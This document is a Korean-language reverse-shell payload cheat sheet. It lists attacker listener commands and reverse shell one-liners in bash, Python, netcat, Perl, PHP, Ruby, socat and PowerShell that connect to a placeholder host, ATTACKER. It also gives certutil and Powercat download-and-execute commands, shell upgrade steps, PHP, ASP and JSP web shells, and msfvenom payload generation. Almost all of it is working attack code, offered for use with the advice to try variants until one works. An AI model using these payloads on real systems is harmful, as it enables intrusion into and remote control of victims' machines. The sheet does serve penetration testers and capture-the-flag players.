# Reverse Shell

target 에서 공격자 listener 로 커넥션을 물어오게 만드는 payload 모음. 환경에 따라 쓸 수 있는 건지 다 다르니까 예비채 여러 개 써보고 굴러가는 걸 쓸 것.

---

## listener

```bash
# Netcat
nc -lvnp 4444
rlwrap nc -lvnp 4444  # readline wrapper (방향키/히스토리)

# Ncat (암호화)
ncat -lvnp 4444 --ssl

# pwncat (자동 업그레이드, 파일 전송, 열거)
pwncat-cs -lp 4444

# socat
socat TCP-LISTEN:4444,reuseaddr,fork -

# Metasploit
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
```

---

## Linux

### Bash

```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# 변형 (sh 환경)
/bin/sh -i >& /dev/tcp/ATTACKER/4444 0>&1
```

### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Netcat

```bash
# -e 지원 시
nc -e /bin/sh ATTACKER 4444

# mkfifo (일반적)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"); ?>
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### socat

```bash
# target
socat TCP:ATTACKER:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# listener (TTY shell)
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

---

## Windows

### PowerShell

```powershell
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
# Base64 encoding 실행
powershell -e BASE64_PAYLOAD

# Powercat
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/powercat.ps1')
powercat -c ATTACKER -p 4444 -e cmd.exe
```

### Certutil + 실행

```cmd
certutil -urlcache -split -f http://ATTACKER/nc.exe C:\temp\nc.exe
C:\temp\nc.exe ATTACKER 4444 -e cmd.exe
```

---

## Shell 업그레이드 (Linux)

```bash
# 1. PTY 스폰
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 또는
script /dev/null -c bash

# 2. Ctrl+Z (백그라운드)

# 3. 터미널 설정
stty raw -echo; fg

# 4. 환경변수
export TERM=xterm
export SHELL=/bin/bash
stty rows 50 cols 200
```

---

## Web Shell

### PHP

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

### ASP/ASPX

```asp
<%response.write CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()%>
```

### JSP

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

---

## payload 생성 (msfvenom)

```bash
# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell.elf

# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw -o shell.php

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war

# Python
msfvenom -p cmd/unix/reverse_python LHOST=ATTACKER LPORT=4444 -f raw

# DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o shell.dll
```
